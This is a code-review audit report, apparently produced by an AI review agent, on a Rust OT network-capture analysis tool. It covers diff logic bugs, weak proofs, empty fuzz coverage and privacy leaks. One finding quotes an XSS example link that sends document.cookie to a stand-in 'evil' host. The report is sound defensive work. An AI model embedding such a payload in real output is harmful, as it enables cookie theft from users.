# Adversarial Review — ADV-P1 (Implementation)

**Cycle:** v0.4.0-feature
**Pass:** 1 (first pass)
**Target:** implementation
**Scope:** `--scope=full` — all of `src/`, `tests/`, `.github/workflows/`, scripts, fuzz harnesses
**Develop tip reviewed:** `7c98a3a` (post-wave-2 + F-W2-001..004)
**Date:** 2026-05-23
**Adversary:** vsdd-factory:adversary (fresh context — no access to prior reviews, tech-debt register, or red-gate logs)
**Policies applied:** all 12 policies from `.factory/policies.yaml`

## Pass Summary

- **Total findings:** 18
- **By severity:** CRITICAL=0, HIGH=5, MEDIUM=10, LOW=3
- **By category:** Privacy=6, Correctness=7, Test-discipline=3, Security=1, Policy-11=2, Policy-12=1 (overlapping)
- **Confidence high-watermark:** 9 HIGH-confidence findings
- **Policy compliance:** 10/12 cleanly verified
  - POL-11 (ci_positive_coverage_assertion): FAIL — `kani.yml` + `fuzz.yml` emit no positive-coverage assertion (F-ADV-P1-010, F-ADV-P1-011)
  - POL-12 (no_user_paths_in_committed_artifacts): runtime audit-log leak (F-ADV-P1-015); the lint script itself is wired correctly
- **Novelty:** FIRST-PASS — all 18 findings are new
- **Recommendation:** FIX-AND-RERUN. The 5 HIGH findings cluster around two themes:
  1. `otsniff diff` has structural correctness/privacy gaps not yet covered by the F-W2 series (F-ADV-P1-001, 002, 003, 007 if reclassified)
  2. Privacy-invariant proof claims are weaker than advertised (composed Kani proof is tautological; fuzz coverage of scrub substitution is empty; unscrub leak surface is unguarded — F-ADV-P1-004, 005, 006)

Priority order suggested: F-ADV-P1-001 → 002 → 003 → 014 (XSS) → 007 → 004 → 005 → 006.

---

## Findings

### F-ADV-P1-001: `otsniff diff` ignores user OT subnet configuration; findings layer always uses RFC1918 defaults

**Severity:** HIGH
**Category:** Correctness
**Files:** `src/cli.rs:92-112`, `src/cli.rs:258-266`, `src/cli.rs:289-290`
**Evidence:**
```rust
// cli.rs:92 — diff command definition: NO --ot-subnet arg
Diff {
    baseline_pcap: PathBuf,
    current_pcap: PathBuf,
    #[arg(long)] baseline_map: PathBuf,
    #[arg(long)] current_map: PathBuf,
    #[arg(short, long)] output: PathBuf,
    #[arg(long, default_value_t = crate::diff::DEFAULT_FLOW_SHIFT_MULTIPLIER)]
    flow_shift_multiplier: f64,
},
// cli.rs:266
let ot_subnets = ot_or_default(&[]);
// cli.rs:289-290
let base_findings = crate::findings::run_all(&base_obs, &ot_subnets);
let curr_findings = crate::findings::run_all(&curr_obs, &ot_subnets);
```
**Why it's a finding:** `analyze` accepts `--ot-subnet` and the findings layer's behaviour depends on it (`engineering_commands` severity escalation, `internet_egress`, `recon_scan`, `ntp_external`, `dns_resolver` all branch on OT-subnet membership). The `diff` subcommand has no `--ot-subnet` flag and hardcodes the RFC1918 default. A plant on 100.64/10, 169.254/16 carrier-grade NAT, or a non-RFC1918 segment will produce a different finding set in `diff` than the `analyze` reports the user just reviewed — every flow source will be "unknown_origin", every host will appear non-OT, severities will be misclassified, and the resulting `findings_new`/`findings_resolved` will be artifacts of the missing CLI surface, not real changes.
**Suggested remediation:** Add `--ot-subnet` (repeatable) to the `Diff` clap variant, thread it into `run_diff`, and call `ot_or_default(&user_supplied)` instead of `ot_or_default(&[])`.
**Confidence:** HIGH

---

### F-ADV-P1-002: `run_diff` post-filters `flow_shifts` for user multiplier but cannot recover shifts compute() already discarded

**Severity:** HIGH
**Category:** Correctness
**Files:** `src/cli.rs:306-315`, `src/diff.rs:538`, `src/diff.rs:563-579`
**Evidence:**
```rust
// cli.rs:312-315 — only post-filter; never re-include
if (flow_shift_multiplier - crate::diff::DEFAULT_FLOW_SHIFT_MULTIPLIER).abs() > f64::EPSILON {
    diff.flow_shifts
        .retain(|fs| fs.ratio >= flow_shift_multiplier);
}
// diff.rs:538 — compute always uses DEFAULT (2.0); never sees user threshold
let multiplier = DEFAULT_FLOW_SHIFT_MULTIPLIER;
// diff.rs:569-578 — flows with ratio < 2.0 are dropped permanently
if ratio >= multiplier {
    flow_shifts.push(FlowDelta { ... });
}
```
**Why it's a finding:** If the user invokes `otsniff diff --flow-shift-multiplier 1.5`, `compute` runs first with the hardcoded 2.0 threshold and silently discards all flows with ratio in `[1.5, 2.0)`. The post-filter then retains entries with `ratio ≥ 1.5`, but the dropped flows are gone. The lower-than-default multiplier is **silently a no-op** (it only takes effect for raising the threshold, which is the less interesting direction). The CLI flag advertises a tunable that does not work for half the configuration space.
**Suggested remediation:** Either (a) thread `flow_shift_multiplier` into `DiffInput` / `compute()` and apply the user value inside the loop, or (b) document explicitly that the multiplier is "min-only" and validate at parse time that it is ≥ `DEFAULT_FLOW_SHIFT_MULTIPLIER`.
**Confidence:** HIGH

---

### F-ADV-P1-003: LDAP-creds evidence uses Unicode `→` but diff endpoint extractors only match ASCII `->`; src-side pseudonym never extracted

**Severity:** HIGH
**Category:** Correctness / Privacy
**Files:** `src/findings/ldap_creds.rs:92-97`, `src/diff.rs:164-180`
**Evidence:**
```rust
// ldap_creds.rs:93 — Unicode arrow U+2192
format!(
    "{} → {}:{}",
    host_label(*src, obs),
    host_label(*dst, obs),
    port_str
)
// diff.rs:166-179 — all arrow patterns are ASCII "->"
static PATTERN_IP_ARROW_IP_PORT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(&format!(r"({IPV4})\s*->\s*({IPV4}):(\d+)")).expect("valid regex"));
static PATTERN_IP_ARROW_IP: LazyLock<Regex> = ...r"({IPV4})\s*->\s*({IPV4})"...
static PATTERN_PSEUDO_ARROW_PSEUDO_PORT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(host_\d+)\s*->\s*(host_\d+):(\d+)")...
```
**Why it's a finding:** Two of the six `creds.ldap_simple_bind` findings against different source hosts to the same destination port will produce the same diff key `(rule_id, "", dst_pseudo, port)` because `PATTERN_IP_PORT` (the fallback) only captures dst+port. The diff will mis-classify them as `recurring` when in fact the perpetrator changed. The unicode arrow also defeats the `PATTERN_IP_ARROW_IP*` family, so the src field is silently dropped — exactly the F-W2-004 problem the recently-shipped diff was supposed to fix. The fix was applied to engineering commands but not ldap_creds.
**Suggested remediation:** Either (a) change ldap_creds to use `->` for parser-friendliness while keeping `→` for display, or (b) add `→`-aware patterns in `diff.rs`. Option (a) is preferable for consistency with the other detectors.
**Confidence:** HIGH

---

### F-ADV-P1-004: `scrub_text` fuzz harness uses empty ScrubMap; substitution path is never fuzzed

**Severity:** HIGH
**Category:** Test-discipline / Privacy
**Files:** `fuzz/fuzz_targets/scrub_text.rs:13-22`
**Evidence:**
```rust
let map = otsniff::scrub::ScrubMap {
    version: 1,
    created_at: chrono::Utc::now(),
    ips: BTreeMap::new(),
    macs: BTreeMap::new(),
    names: BTreeMap::new(),
};
let text = String::from_utf8_lossy(data);
let _ = otsniff::scrub::scrub_text(&text, &map);
```
**Why it's a finding:** With an empty map, `forward()` is empty, `entries` is empty, and `scrub_text` returns `text.to_string()` after the for loop iterates zero times. The actual substitution branch (`if out.contains(real.as_str()) { out = out.replace(...) }` at scrub.rs:316-318) is never exercised. The fuzz harness consequently provides ZERO coverage of the substitution algorithm, the longest-first sort, or any overlap pathology. The Kani proof comment at scrub.rs:393 explicitly defers "model-vs-production equivalence" to "the fuzz suite (S-3.04)" — but the suite under-delivers.
**Suggested remediation:** Make the fuzz harness construct a small symbolic map (e.g. one ASCII IP + one pseudonym derived from `data[0..n]`) so the actual replacement path runs on every input.
**Confidence:** HIGH

---

### F-ADV-P1-005: Composed Kani proof asserts equivalence of `byte_contains_model` with itself; proves no production property

**Severity:** HIGH
**Category:** Privacy / Test-discipline
**Files:** `src/kani_proofs.rs:253-302`, `tests/s_4_04_composed_kani_proof.rs:1-272`
**Evidence:**
```rust
// kani_proofs.rs:253 — model call
let leaked = byte_contains_model(scrubbed_slice, real);
// kani_proofs.rs:260-285 — "concrete recomputation" is the SAME algorithm
let actually_contains = {
    if real_len > scrubbed_len { false } else {
        // ... identical naïve linear substring search ...
    }
};
// kani_proofs.rs:297 — asserts identity-against-itself
assert_eq!(leaked, actually_contains, "...");
```
**Why it's a finding:** `byte_contains_model` and the "concrete brute-force recomputation" are the same naïve linear substring search written twice with identical loop structure. The assertion `leaked == actually_contains` is a tautology in CBMC — neither uses regex, neither touches `crate::scrub::scrub_text` or `crate::ai::leak_detector::ensure_clean`, and equivalence with production is explicitly deferred to fuzz coverage which itself is empty for scrub_text (see F-ADV-P1-004). The marketing claim "composed Kani proof of the privacy invariant" in CLAUDE.md is unsupported by the actual proof body.
**Suggested remediation:** Either (a) rewrite the harness to do something non-tautological — e.g. take a symbolic input, scrub through `replace_first_model`, then assert the leak detector model returns false; alternatively prove a postcondition about what `replace_first_model` actually produces — or (b) reduce the claim to "Kani-checked self-consistency of the leak-detector substring model" and document the gap explicitly in the privacy invariant doc.
**Confidence:** HIGH

---

### F-ADV-P1-006: `unscrub` subcommand has no leak check; AI response with raw IPs flows straight to user output

**Severity:** MEDIUM
**Category:** Privacy
**Files:** `src/cli.rs:821-891`
**Evidence:**
```rust
// cli.rs:849
let (output, replaced, unmapped) = unscrub_text(&input_text, &map);
// cli.rs:864-889 — output is written verbatim, only `strict` checks unmapped pseudonyms
match &args.output {
    Some(p) => { std::fs::write(p, output).map_err(...)?; ... }
    None => { std::io::stdout().write_all(output.as_bytes())... }
}
```
**Why it's a finding:** When the user pastes a Claude/ChatGPT response into `otsniff unscrub`, the AI may have hallucinated real-looking IPs/MACs/hostnames. The `analyze --ai` flow runs `ensure_clean` + `ensure_no_map_values` on the prompt going to the AI but the `unscrub` path applies no symmetric guard on the AI's response before writing it. This breaks the symmetry of the "fail-closed" claim for users on the documented advanced flow.
**Suggested remediation:** Run `leak_detector::ensure_clean(&output)` after `unscrub_text` and (a) refuse to write with a clear error pointing at the offending pattern, or (b) at minimum warn to stderr citing the substring.
**Confidence:** HIGH

---

### F-ADV-P1-007: Diff JSON output path skips the `--audit-log` chain-of-custody artifact

**Severity:** MEDIUM
**Category:** Privacy / Policy
**Files:** `src/cli.rs:258-352`
**Evidence:** The `run_diff` function writes pseudonymized JSON/HTML/MD via `std::fs::write(&output, content)` (cli.rs:339) and never invokes `leak_detector::ensure_clean` or `ensure_no_map_values` on the rendered content; nor does it emit an `audit.json` companion. Compare to `run_analyze` cli.rs:720-766 which does both for `--ai` runs.
**Why it's a finding:** F-W2-003 was specifically a privacy regression — the diff was leaking raw IPs. The fix added `scrub_finding` (diff.rs:623-641), but the *output* is never re-validated by `ensure_clean`. If a future refactor (or a finding whose evidence format the regex extractors miss — see F-ADV-P1-003) leaves a raw IP in `summary`/`evidence`/`flow.src`/etc., the diff output will silently carry it.
**Suggested remediation:** After rendering `content` in `run_diff` (cli.rs:324-337), run `leak_detector::ensure_clean(&content)` and on Json/Md outputs also `ensure_no_map_values(&content, &base_map)` + `ensure_no_map_values(&content, &curr_map)`. Fail closed if any leak is found.
**Confidence:** HIGH

---

### F-ADV-P1-008: `diff::compute` warning for disjoint maps is fired on legitimate first-run scenario, hides real misconfiguration

**Severity:** MEDIUM
**Category:** Correctness
**Files:** `src/diff.rs:309-322`
**Suggested remediation:** Either (a) require the user to opt into disjoint diff via `--disjoint-ok` (and fail otherwise), or (b) tag the warning with a noise-suppression key so the audit log records the intent without spamming stderr.
**Confidence:** MEDIUM

---

### F-ADV-P1-009: `scrub_text` substring-replacement vulnerable to overlapping real values (sort order does not guarantee correctness)

**Severity:** MEDIUM
**Category:** Privacy
**Files:** `src/scrub.rs:307-321`
**Suggested remediation:** After the substitution loop, run `ensure_no_map_values(&out, map)` inside scrub_text and panic / return Err if any real value survived. Currently this check happens only at scrub.rs callsites in the CLI layer.
**Confidence:** MEDIUM

---

### F-ADV-P1-010: `kani.yml` per-harness `continue-on-error: true` means a silently-skipped harness still reports CI green if the summary parser fails

**Severity:** MEDIUM
**Category:** Policy-11 / Test-discipline
**Files:** `.github/workflows/kani.yml:18-78`
**Suggested remediation:** (a) Build the outcome list at runtime via `jobs.steps.[*].outcome` JSON so no symbol can be silently dropped; (b) emit a positive-coverage line of the form `echo "Check passed: $count harnesses succeeded (of $total expected)"`.
**Confidence:** MEDIUM

---

### F-ADV-P1-011: `fuzz.yml` weekly cron has no positive-coverage assertion despite parsing-and-extraction nature of `cargo fuzz run`

**Severity:** MEDIUM
**Category:** Policy-11
**Files:** `.github/workflows/fuzz.yml:1-44`
**Suggested remediation:** After the fuzz invocation, grep the stdout for the `#NNN INITED` / `#NNN pulse` lines libFuzzer emits and assert at least one is present, plus emit `echo "Check passed: harness $h ran $count executions over $T seconds"`.
**Confidence:** MEDIUM

---

### F-ADV-P1-012: `is_broadcast_or_multicast` excludes broadcast destinations from scan-detector counts but only catches `255.255.255.255`

**Severity:** LOW
**Category:** Correctness
**Files:** `src/findings/recon_scan.rs:194-199`
**Suggested remediation:** Either (a) skip the last octet `.255` defensively as a heuristic (matches `/24` plants which are typical OT), or (b) reword the trigger string to say only limited-broadcast and multicast are excluded.
**Confidence:** MEDIUM

---

### F-ADV-P1-013: `dnp3::parse` ignores frame `length` field and does not verify the application-layer offset

**Severity:** MEDIUM
**Category:** Correctness
**Files:** `src/parse/dnp3.rs:46-55`
**Suggested remediation:** Read `length` at offset 2; verify `length >= 5`; compute application offset more carefully (transport byte at offset 10); reject if FIR bit is not set (only first segment carries the function code).
**Confidence:** MEDIUM

---

### F-ADV-P1-014: `render_safe` does not filter `javascript:` and `data:` URLs in markdown links; documented but actively exploitable

**Severity:** MEDIUM
**Category:** Security
**Files:** `src/ai/html_render.rs:77-92`
**Evidence:**
```rust
#[test]
fn strips_javascript_url_pseudo_protocol() {
    let md = "[click me](javascript:alert(1))";
    let html = render_safe(md);
    // We DO render the link — confirming current behavior.
    assert!(html.contains("href=\"javascript:"));
}
```
**Why it's a finding:** The test name says "strips" but the assertion verifies the link is NOT stripped. An AI response containing `[click me](javascript:fetch('https://evil/?'+document.cookie))` will land in the user's HTML report as a clickable `href="javascript:..."`. Modern Chromium-based browsers DO follow `javascript:` URLs from `<a href>` clicks. `data:text/html,...` URLs are not filtered either. Inline raw HTML is stripped (good), but the AI's markdown can still smuggle in javascript-protocol XSS via link syntax.
**Suggested remediation:** Add a post-processing pass that walks generated HTML and strips `href` attributes whose value (after trimming + lowercasing) starts with `javascript:`, `data:`, or `vbscript:`. Replace with `#`. Update the test to assert the strip occurs.
**Confidence:** HIGH

---

### F-ADV-P1-015: `audit.path` JSON field contains the input PCAP's full path including user home directory

**Severity:** LOW
**Category:** Privacy / Policy-12
**Files:** `src/cli.rs:730-735`, `src/audit.rs:46-51`
**Suggested remediation:** Normalise the path to a basename + the SHA-256 hash (already present): `path: args.input.file_name().to_string_lossy().to_string()`. Or add a `--audit-anonymise-path` flag.
**Confidence:** HIGH

---

### F-ADV-P1-016: `pcap::iter_packets` skips IPv6 / non-Ethernet link types silently after first packet

**Severity:** LOW
**Category:** Correctness
**Files:** `src/pcap.rs:136-138`, `src/pcap.rs:158-164`
**Suggested remediation:** Either (a) handle the `LinkSlice::EthernetWithVlan` variant, or (b) emit a stderr warning the first time the catch-all `_ => return None` arm is taken so the user sees the silent loss.
**Confidence:** MEDIUM

---

### F-ADV-P1-017: `scrub::merge_map` can panic in production (EC-002 panic path) on a corrupted on-disk baseline map

**Severity:** MEDIUM
**Category:** Correctness
**Files:** `src/scrub.rs:205-213`, `src/cli.rs:454-462`
**Suggested remediation:** Replace `panic!` with `Err(OtError::Parse(...))` and propagate. Treat scrub-map corruption as bad input, exit code 2, not a crash.
**Confidence:** MEDIUM

---

### F-ADV-P1-018: `scrub_finding` does not scrub `Finding.id` or `Finding.recommendation`; static strings are safe today but the type system permits a future regression

**Severity:** LOW
**Category:** Privacy / Test-discipline
**Files:** `src/diff.rs:623-641`, `src/findings/mod.rs:65-79`
**Suggested remediation:** Either (a) make Finding own `recommendation: String` if you intend to allow per-finding text (and scrub it), or (b) add a `compile_error!`-style static_assertion that recommendation remains `&'static str`, or (c) close the gap by adding the `ensure_clean` call in F-ADV-P1-007 which is defense-in-depth for this and other field-addition scenarios.
**Confidence:** MEDIUM

---

## Convergence assessment

This is ADV-P1 of an expected ≥3-pass convergence loop. Per the adversarial-review skill's Iron Law, no approval without ≥3 clean passes. Recommended next steps:

1. Triage findings into tech-debt register (F-ADV-P1-001 through F-ADV-P1-018 → F-W3-NNN entries)
2. Fix HIGH-severity findings before declaring wave-2 truly closed
3. Re-run ADV-P2 against post-fix tip to verify the fixes resolved the findings AND look for new ones
4. Continue until 3 consecutive clean passes (≤MEDIUM findings only, no novelty)
